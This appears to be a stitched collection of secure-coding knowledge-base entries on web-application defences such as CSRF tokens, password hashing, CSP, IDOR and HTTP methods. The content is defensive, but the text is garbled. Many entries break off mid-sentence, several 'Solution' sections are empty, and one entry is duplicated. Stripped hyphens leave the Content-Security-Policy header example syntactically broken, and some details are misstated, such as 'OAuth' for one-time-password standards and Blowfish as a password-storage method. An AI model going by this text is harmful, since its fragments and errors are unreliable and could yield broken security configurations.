Because this process is difficult to reverse (similar to a cryptographic hash function)
but can also be configured to be slow to compute, key derivation functions are ideally 
suited for password hashing use cases.

Another alternative would be bcrypt. bcrypt is a password hashing function designed by 
Niels Provos and David Mazières, based on the Blowfish cipher, and presented at USENIX in 
1999. Besides incorporating a salt to protect against rainbow table attacks, bcrypt is an 
adaptive function: over time, the iteration count can be increased to make it slower, 
so it remains resistant to bruteforce search attacks even with increasing computation power.

CrossSite Request Forgery (CSRF) is a type of attack that occurs when a malicious Web site,
email, blog, instant message, or program causes a users Web browser to perform an unwanted
action on a trusted site for which the user is currently authenticated.

The impact of a successful crosssite request forgery attack is limited to the
capabilities exposed by the vulnerable application. For example, this attack could result
in a transfer of funds, changing a password, or purchasing an item in the users context.
In effect, CSRF attacks are used by an attacker to make a target system perform a
function (funds Transfer, form submission etc.) via the targets browser without
knowledge of the target user at least until the unauthorised function has been committed.

 Solution:

To arm an application against automated attacks and tooling you need to use unique tokens
which are included into the forms of an application, API calls or AJAX requests.  
Any state changing operation requires a secure random token (e.g CSRF token) to prevent
against CSRF attacks. Characteristics of a CSRF Token are a unique, large random
value generated by a cryptographically secure random number generator.

The CSRF token is then added as a hidden field for forms and validated on the sever side whenever
a user is sending a request to the server.

Note :
Whenever the application is an REST service and is using tokens such as JWT tokens, whenever these tokens are being sent
in the application headers rather than stored in cookies the application should not be suspectible to CSRF attacks for a succesfull CSRF attacke depends on the browsers cookie jar.

 Solution:

1 risk based authentication:
In Authentication, riskbased authentication is a nonstatic authentication 
system which takes into account the profile of the agent requesting access to 
the system to determine the risk profile associated with that transaction. 

The risk profile is then used to determine the complexity of the challenge.
Higher risk profiles leads to stronger challenges, whereas a static username/password may suffice for 
lowerrisk profiles. Riskbased implementation allows the application to challenge the user for additional 
credentials only when the risk level is appropriate.

2 two factor authentication:
Multifactor authentication (MFA) is a method of computer access control in which a user is 
granted access only after successfully presenting several separate pieces of evidence to an 
authentication mechanism – typically at least two of the following categories: knowledge (something they know), 
possession (something they have), and inherence (something they are)

3 Transaction signing:
Transaction signing (or digital transaction signing) is the process of calculating a keyed hash function 
to generate a unique string which can be used to verify both the authenticity and integrity of an online transaction.

A keyed hash is a function of the user''s private or secret key and the transaction details, 
such as the transfer to the account number and the transfer amount.

To provide a high level of assurance of the authenticity and integrity of 
the hash it is essential to calculate the hash on a trusted device, such as a separate smart card reader.
Calculating a hash on an Internetconnected PC or mobile device such as a mobile telephone/PDA would be
counterproductive as malware and attackers can attack these platforms and potentially subvert the signing process itself.

Web Services Security (WSSecurity, WSS) is an extension to SOAP to apply security to 
Web services. It is a member of the Web service specifications and was published by OASIS.

The protocol specifies how integrity and confidentiality can be enforced on messages and allows 
the communication of various security token formats, such as Security Assertion Markup Language (SAML), 
Kerberos, and X.509. Its main focus is the use of XML Signature and XML Encryption to provide endtoend security.

 Solution:

WSSecurity describes three main mechanisms:

How to sign SOAP messages to assure integrity. Signed messages also provide nonrepudiation.
How to encrypt SOAP messages to assure confidentiality.
How to attach security tokens to ascertain the sender''s identity.
The specification allows a variety of signature formats, encryption algorithms and multiple trust domains, and is open to various security token models, such as:

X.509 certificates,
Kerberos tickets,
User ID/Password credentials,
SAML Assertions, and
customdefined tokens.
The token formats and semantics are defined in the associated profile documents.

WSSecurity incorporates security features in the header of a SOAP message, working in the application layer.

These mechanisms by themselves do not provide a complete security solution for Web services. Instead, this specification is a building block that can be used in conjunction with other Web service extensions and higherlevel applicationspecific protocols to accommodate a wide variety of security models and security technologies. In general, WSS by itself does not provide any guarantee of security. When implementing and using the framework and syntax, it is up to the implementor to ensure that the result is not vulnerable.

Key management, trust bootstrapping, federation and agreement on the technical details (ciphers, formats, algorithms) is outside the scope of WSSecurity.

 Use cases:

Endtoend security
If a SOAP intermediary is required, and the intermediary is not more or less trusted, messages need to be signed and optionally encrypted. This might be the case of an applicationlevel proxy at a network perimeter that will terminate TCP (transmission control protocol) connections.

Nonrepudiation
One method for nonrepudiation is to write transactions to an audit trail that is subject to specific security safeguards. Digital signatures, which WSSecurity supports, provide a more direct and verifiable nonrepudiation proof.

Alternative transport bindings
Although almost all SOAP services implement HTTP bindings, in theory other bindings such as JMS or SMTP could be used; in this case endtoend security would be required.

Reverse proxy/common security token
Even if the web service relies upon transport layer security, it might be required for the service to know about the end user, if the service is relayed by a (HTTP) reverse proxy. A WSS header could be used to convey the end user''s token, vouched for by the reverse proxy.

Whenever the application provides a password forget functionality or another 
type of recovery methods there are several implementations of hardened proven ways to make

 Solution:

The recommended solutions are to use TOTP (Timebased OneTime Password algorithm). This 
method is an example of a hashbased message authentication code (HMAC). It combines a 
secret key with the current timestamp using a cryptographic hash function to generate 
a onetime password. Because network latency and outofsync clocks can result in the password 
recipient having to try a range of possible times to authenticate against, the timestamp typically 
increases in 30second intervals, which thus cuts the potential search space.

Or the other option is to use a Mathematicalalgorithmbased onetime password method. This other 
type of onetime password uses a complex mathematical algorithm, such as a hash chain, to generate 
a series of onetime passwords from a secret shared key. Each password cannot be guessed even when 
previous passwords are known. The open source OAuth algorithm is standardized; other algorithms are 
covered by U.S. patents. Each password is observably unpredictable and independent on previous ones. 
Therefore, an adversary would be unable to guess what the next password may be, even with the 
knowledge of all previous passwords.

Example of a hard token mathimatical algorithm would be a yubikey
Example of a soft token TOTP would be google authenticator

The last resort would be to send a new password by email. This mail should contain a reset link with 
a token which is valid for a limited amount of time. Additional authentication based on softtokens

 Solution:

Subdomain takeover is a process of registering a nonexisting domain name to gain control over another domain. 
The most common scenario of this process follows:

Domain name (e.g., sub.example.com) uses a CNAME record to another domain (e.g., sub.example.com CNAME anotherdomain.com).
At some point in time, anotherdomain.com expires and is available for registration by anyone.
Since the CNAME record is not deleted from example.com DNS zone, anyone who registers anotherdomain.com has
full control over sub.example.com until the DNS record is present.

The implications of the subdomain takeover can be pretty significant. Using a subdomain takeover, attackers
can send phishing emails from the legitimate domain, perform crosssite scripting (XSS), or damage the

SameSite prevents the browser from sending this cookie along with crosssite requests. 
The main goal is mitigate the risk of crossorigin information leakage. It also provides some 
protection against crosssite request forgery attacks.


Solution:
The strict value will prevent the cookie from being sent by the browser to the target site in all 
crosssite browsing context, even when following a regular link. For example, for a GitHublike website this 
would mean that if a loggedin user follows a link to a private GitHub project posted on a corporate discussion 
forum or email, GitHub will not receive the session cookie and the user will not be able to access the project.

A bank website however most likely doesn''t want to allow any transactional pages to be linked from external

to maintain user''s loggedin session after the user arrives from an external link. In the above GitHub scenario,

Command injection is an attack in which the goal is execution of arbitrary commands on

possible when an application passes unsafe user supplied data
(forms, cookies, HTTP headers etc.) to a system shell. In this attack,
the attackersupplied operating system commands are usually executed with the privileges
of the vulnerable application. Command injection attacks are possible largely due to
insufficient input validation. This attack differs from Code Injection, in that code
injection allows the attacker to adds his own code that is then executed by the application.
In Code Injection, the attacker extends the default functionality of the application
without the necessity of executing system commands.

 Solution:

The main use of the content security policy header is to, detect, report, and reject XSS attacks. The core issue in relation to XSS attacks is the browser''s inability to distinguish between a script that''s intended to be part of your application, and a script that''s been maliciously injected by a thirdparty.
With the use of CSP(Content Security policy), we can tell the browser which script is safe to execute and which scripts are most likely been injected by an attacker.

 Solution:

A best practice for implementing CSP in your application would be to externalize all
JavaScript within the web pages.

So this:
    ```
    <script>
      function doSomething() {
        alert(''Something!'');
      }
	</script>

	<button onclick=''doSomething();''>foobar!</button>
```
Must become this:
```
	<script src=''doSomething.js''></script>
	<button id=''somethingToDo''>Let''s foobar!</button>
```
The header for this code could look something like:
    ```
    ContentSecurityPolicy: defaultsrc''self''; objectsrc''none''; scriptsrc''https://mycdn.com''
    ```
Since it is not entirely realistic to implement all JavaScript on external pages we can apply sort of a crosssite request forgery token to your inline JavaScript. This way the browser can again distinguish the difference between code which is part of the application against probable malicious injected code, in CSP this is called the ''nonce''. Of course, this method is also very applicable on your existing code and designs.
Now, to use this nonce you have to supply your inline script tags with the nonce attribute. Firstly, it''s important that the nonce changes for each response. Otherwise, the nonce would become guessable. So it should also contain a high entropy and should be hard to predict. Similar to the operation of the CSRF tokens, the nonce becomes impossible for the attacker to predict making it difficult to execute a successful XSS attack.


Inline JavaScript example containing nonce:
	```
	<script nonce=sfsdf03nceI23wlsgle9h3sdd21>
    <! Your javscript code >
    </script>
    ```
Matching header example:
    ```

Exception handling is the process of responding to the occurrence, during computation, 
of exceptions – anomalous or exceptional conditions requiring special processing 
often disrupting the normal flow of program execution. It is provided by specialized 
programming language constructs, computer hardware mechanisms like interrupts or operating 
system IPC facilities like signals.

In general, an exception breaks the normal flow of execution and executes a preregistered 
exception handler. The details of how this is done depends on whether it is a hardware or 
software exception and how the software exception is implemented. Some exceptions, 
especially hardware ones, may be handled so gracefully that execution can resume where it was interrupted.

Alternative approaches to exception handling in software are error checking,

filter exceptional cases.

Serialization is the process of turning some object into a data format that can be restored later. 
People often serialize objects in order to save them to storage, or to send as part of communications.

Deserialization is the reverse of that process, taking data structured from some format, and rebuilding it
into an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML.

However, many programming languages offer a native capability for serializing objects. These native formats
usually offer more features than JSON or XML, including customizability of the serialization process.

Unfortunately, the features of these native deserialization mechanisms can be repurposed for malicious
effect when operating on untrusted data. Attacks against deserializers have been found to allow denialofservice,
access control, and remote code execution (RCE) attacks.


 Solution:

Verify that serialized objects use integrity checks or are encrypted to prevent hostile object creation or data tampering.

A great reduction of risk is achieved by avoiding native (de)serialization formats. By switching to a 
pure data format like JSON or XML, you lessen the chance of custom deserialization logic being repurposed 
towards malicious ends.

objects for the explicit purpose data transfer. Of course, it''s still possible that the application 
will make security mistakes after a pure data object is parsed.

Threat modeling is best applied continuously throughout a software development project.
The process is essentially the same at different levels of abstraction, although the
information gets more and more granular throughout the lifecycle. Ideally, a highlevel
threat model should be defined in the concept or planning phase, and then refined

HTTP offers a number of methods that can be used to perform actions on the web server.
Many of these methods are designed to aid developers in deploying and testing
HTTP applications. These HTTP methods can be used for nefarious purposes if the web
server is misconfigured. It recommended to read about the different available methods, their purposes and
limitations.

Available method are:

GET
The GET method requests a representation of the specified resource. Requests using GET should only retrieve data and should have no other effect. (This is also true of some other HTTP methods.)[1] The W3C has published guidance principles on this distinction, saying, "Web application design should be informed by the above principles, but also by the relevant limitations.

HEAD
The HEAD method asks for a response identical to that of a GET request, but without the response body. This is useful for retrieving metainformation written in response headers, without having to transport the entire content.

POST
The POST method requests that the server accept the entity enclosed in the request as a new subordinate of the web resource identified by the URI. The data POSTed might be, for example, an annotation for existing resources; a message for a bulletin board, newsgroup, mailing list, or comment thread; a block of data that is the result of submitting a web form to a datahandling process; or an item to add to a database.


PUT
The PUT method requests that the enclosed entity be stored under the supplied URI. If the URI refers to an already existing resource, it is modified; if the URI does not point to an existing resource, then the server can create the resource with that URI.


DELETE
The DELETE method deletes the specified resource.


TRACE
The TRACE method echoes the received request so that a client can see what (if any) changes or additions have been made by intermediate servers.

OPTIONS
The OPTIONS method returns the HTTP methods that the server supports for the specified URL. This can be used to check the functionality of a web server by requesting ''*'' instead of a specific resource.

CONNECT
The CONNECT method converts the request connection to a transparent TCP/IP tunnel, usually to facilitate SSLencrypted communication (HTTPS) through an unencrypted HTTP proxy.

PATCH
The PATCH method applies partial modifications to a resource.

Some of the methods (for example, GET, HEAD, OPTIONS and TRACE) are, by convention, defined as safe, which means they are intended only for information retrieval and should not change the state of the server. In other words, they should not have side effects, beyond relatively harmless effects such as logging, web caching, the serving of banner advertisements or incrementing a web counter. Making arbitrary GET requests without regard to the context of the application''s state should therefore be considered safe. However, this is not mandated by the standard, and it is explicitly acknowledged that it cannot be guaranteed.

Despite the prescribed safety of GET requests, in practice their handling by the server is not technically limited in any way. Therefore, careless or deliberate programming can cause nontrivial changes on the server. This is discouraged, because it can cause problems for web caching, search engines and other automated agents, which can make unintended changes on the server. For example, a website might allow deletion of a resource through a URL such as http://example.com/article/1234/delete, which, if arbitrarily fetched, even using GET, would simply delete the article.

By contrast, methods such as POST, PUT, DELETE and PATCH are intended for actions that may cause side effects either on the server, or external side effects such as financial transactions or transmission of email. Such methods are therefore not usually used by conforming web robots or web crawlers; some that do not conform tend to make requests without regard to context or consequences.

Methods PUT and DELETE are defined to be idempotent, meaning that multiple identical requests should have the same effect as a single request (note that idempotence refers to the state of the system after the request has completed, so while the action the server takes (e.g. deleting a record) or the response code it returns may be different on subsequent requests, the system state will be the same every time). Methods GET, HEAD, OPTIONS and TRACE, being prescribed as safe, should also be idempotent, as HTTP is a stateless protocol.

In contrast, the POST method is not necessarily idempotent, and therefore sending an identical POST request multiple times may further affect state or cause further side effects (such as financial transactions). In some cases this may be desirable, but in other cases this could be due to an accident, such as when a user does not realize that their action will result in sending another request, or they did not receive adequate feedback that their first request was successful. While web browsers may show alert dialog boxes to warn users in some cases where reloading a page may resubmit a POST request, it is generally up to the web application to handle cases where a POST request should not be submitted more than once.

Note that whether a method is idempotent is not enforced by the protocol or web server. It is perfectly possible to write a web application in which (for example) a database insert or other nonidempotent action is triggered by a GET or other request. Ignoring this recommendation, however, may result in undesirable consequences, if a user agent assumes that repeating the same request is safe when it is not.

The TRACE method can be used as part of a class of attacks known as crosssite tracing; for that reason, common security advice is for it to be disabled in the server configuration. Microsoft IIS supports a proprietary "TRACK" method, which behaves similarly, and which is likewise recommended to be disabled

 Solution:

Verify that the application accepts only a defined set of HTTP request methods, such as
GET and POST and unused methods are explicitly blocked/disabled.

A sandbox is a security mechanism for separating running programs. 
It is often used to execute untested code, or untrusted programs from

Whitelist input validation means allowing only input that is explicitly defined as valid,
as opposed to blacklist input validation, which filters out known bad input.

OCSP stapling, formally known as the TLS Certificate Status Request extension, is an
alternative approach to the Online Certificate Status Protocol (OCSP) for checking the
revocation status of X.509 digital certificates. It allows the presenter of a
certificate to bear the resource cost involved in providing OCSP responses by appending
("stapling") a timestamped OCSP response signed by the CA to the initial TLS Handshake,
eliminating the need for clients to contact the CA

 Solution:

Stapling basically means that the certificate holder queries the OCSP server themselves at
regular intervals, obtaining a signed timestamped OCSP response. When the site''s visitors
attempt to connect to the site, this response is included ("stapled") with the TLS/SSL
Handshake via the Certificate Status Request extension response (note: the TLS client must
explicitly include a Certificate Status Request extension in its ClientHello TLS/SSL
handshake message). While it may appear that allowing the site operator to control
verification responses would allow a fraudulent site to issue false verification for a
revoked certificate, the stapled responses can''t be forged as they need to be directly
signed by the certificate authority, not the server. If the client does not receive a
stapled response, it will just contact the OCSP server by itself. However, if the
client receives an invalid stapled response, it will abort the connection. The only
increased risk of OCSP stapling is that the notification of revocation for a certificate
may be delayed until the lastsigned OCSP response expires.

Passwords stored locally are often vulnerable to offline attacks like dictionary attacks(list of commonly known passwords), bruteforce(permutation of all possible combinations) and rainbow tables(generate hashes upfront and do a look up for each hash).

 Solution:

The most effective solution to eliminate offline attacks on password is to enforce the use of strong passwords and very prominently use industry recognized hashing algorithms with a salting mechanism. We hash passwords because in the event an attacker gets read access to our database, we do not want him to retrieve the passwords plain text.

As web applications become more advanced, an increasing amount of HTML is generated by
JavaScript on the clientside rather than by the server. Anytime content needs to be

Whenever user supplied input is embeded directly into a template when the application
makes use of a templeating engine (jinja2, twig, Freemarker), a malicious attacker can inject

lead to RCE vulnerabilities.

This type of vulnerability is also seen a lot through applications that let the user intentionally
modify the template to provide users a more flexible way to style the applications pages like
a wiki page or CMS system.

 Solution

Applications frequently use the actual name or key of an object when generating web pages. 
Applications don’t always verify the user is authorized for the target object. 
This results in an insecure direct object reference flaw. Testers can easily manipulate parameter 
values to detect such flaws and code analysis quickly shows whether authorization is properly verified.

The most classic example:
The application uses unverified data in a SQL call that is accessing account information:

String query = "SELECT * FROM accts WHERE account = ?";
PreparedStatement pstmt = connection.prepareStatement(query , ... );
pstmt.setString( 1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery();

The attacker simply modifies the ‘acct’ parameter in their browser to send whatever 
account number they want. If not verified, the attacker can access any user’s account, instead of 
only the intended customer’s account.

 Solution:

Preventing insecure direct object references requires selecting an approach 
for protecting each user accessible object (e.g., object number, filename):

Use per user or session indirect object references. This prevents attackers from directly 
targeting unauthorized resources. For example, instead of using the resource’s database key, 
a drop down list of six resources authorized for the current user could use the numbers 1 to 6 to 
indicate which value the user selected. The application has to map the peruser indirect reference 
back to the actual database key on the server.

check to ensure the user is authorized for the requested object.

Reverse tabnabbing is an attack where a page linked from the target page is able to rewrite that page, 
for example to replace it with a phishing site. As the user was originally on the correct page they are 
less likely to notice that it has been changed to a phishing site, especially it the site looks the same as the target. 
If the user authenticates to this new page then their credentials (or other sensitive data) are sent to the phishing site 
rather than the legitimate one.

As well as the target site being able to overwrite the target page, any http link can be spoofed to overwrite the target 
page if the user is on an unsecured network, for example a public wifi hotspot. The attack is possible even if the target 
site is only available via https as the attacker only needs to spoof the http site that is being linked to.

 Solution:

To prevent this issue the following actions are available:

  For html link:
   * To cut this back link then add the attribute rel="noopener" on the 
     tag used to create the link from the parent page to the child page.

     information be present in the request to the child page.
   * To remove also the referrer information then use this attribute value: rel="noopener noreferrer".
  For javascript window.open function, add the values noopener,noreferrer in the windowFeatures parameter of the window.open function.

As the behavior using the elements above is different between the browsers either using html 
link or javascript to open a window (or tab) then use this configuration to maximize the cross supports:

* For html link, add the attribute rel="noopener noreferrer" for every links.

Web applications heavily use databases to store and access the data they need for their
operations. Historically, relational databases have been by far the most common
technology for data storage, but in the last years, we are witnessing an increasing
popularity for databases that organise data using the XML language.
Just like relational databases are accessed via SQL language, XML databases use XPath as
their standard query language.

 Solution:

Just like the techniques to avoid SQL injection, you need to use a parameterised XPath
interface if one is available, or escape the user input to make it safe to include in a
dynamically constructed query. If you are using quotes to terminate untrusted input in a
dynamically constructed XPath query, then you need to escape that quote in the untrusted
input to ensure the untrusted data can not try to break
out of that quoted context.

When you process data you should always enforce policies for the transfer of sensitive data in order to enforce a higher level of security imposing structured thresholds to fend off attackers.

 Solution:

First, you have to create a list which contains locations of where all sensitive data is used and processed. Next, you create a policy that tells who is allowed and to what extent they have privileges to look into which data. When this data moves through the network it should always be encrypted (TLS) and also be stored encrypted. Thereafter you should establish monitoring and testing methods to verify that everything stays encrypted and your policies are properly enforced.
Also, determine whenever data storage is necessary or becomes a redundancy. Whenever sensitive data does not have to be stored don''t store it. This reduces the quantity of data may your application ever be compromised.
Ultimately, verify accessing sensitive data is logged, if the data is collected under relevant data protection directives or where logging of accesses is required.

CrossSite Request Forgery (CSRF) is a type of attack that occurs when a malicious Web site,
email, blog, instant message, or program causes a users Web browser to perform an unwanted
action on a trusted site for which the user is currently authenticated.

The impact of a successful crosssite request forgery attack is limited to the
capabilities exposed by the vulnerable application. For example, this attack could result
in a transfer of funds, changing a password, or purchasing an item in the users context.
In effect, CSRF attacks are used by an attacker to make a target system perform a
function (funds Transfer, form submission etc.) via the targets browser without
knowledge of the target user at least until the unauthorized function has been committed.

 Solution:

REST (REpresentational State Transfer) is a simple stateless architecture that generally runs
over HTTPS/TLS. The REST style emphasizes that interactions between clients and services are
enhanced by having a limited number of operations

Since the architecture is stateless, the application should make use of sessions or cookies to
store the HTTP sessions, which allow associating information with individual visitors. The preferred method for REST
services is to utilize tokens for interactive information interchange between the user and the server. 

By sending this information solely by means of headers, the application is no longer susceptible to CSRF attacks
since the CSRF attack utilizes the browsers cookie jar for succesful attacks.

Validation of user supplied input must always be enforced on the server side.

 Solution:

All validation of input should be handled on the server side. Whenever the validation is handled on 
the server side, the validation logic is outside of the scope of the attacker and he can not influence
the results.

Note: Validation of input should never be done with a blacklisting aproach since attackers can be very
nifty in bypassing these type of constraints. Always perform white list validation checks preferably in
combination on type checking. i.e if the application expects the value to be an integer, do not make
the application accept a value of a string. This input should be logged and rejected.

Passwords should never be stored plaintext or in a reversible format on the application. Whenever an attacker hacks 
into the applications SQL database the passwords are directly compromised. In the case of
prefilled forms in the application, an attacker could also hijack the credentials by badly
configured CORS rules or XSS attacks.

 Solution: 

Verify that forms containing credentials are not filled in by
the application. Prefilling by the application implies that
credentials are stored in plaintext or a reversible format,
which is explicitly prohibited. Passwords should be stored by preferably PBKDF functions.

PBKDF2 uses a pseudorandom function and a configurable number of iterations to derive a
cryptographic key from a password. Because this process is difficult to reverse
(similar to a cryptographic hash function) but can also be configured to be slow to 
compute, key derivation functions are ideally suited for password hashing use cases.

Examples of good ways to store passwords are with, BCRYPT, Blowfish or in some cases SCRYPT
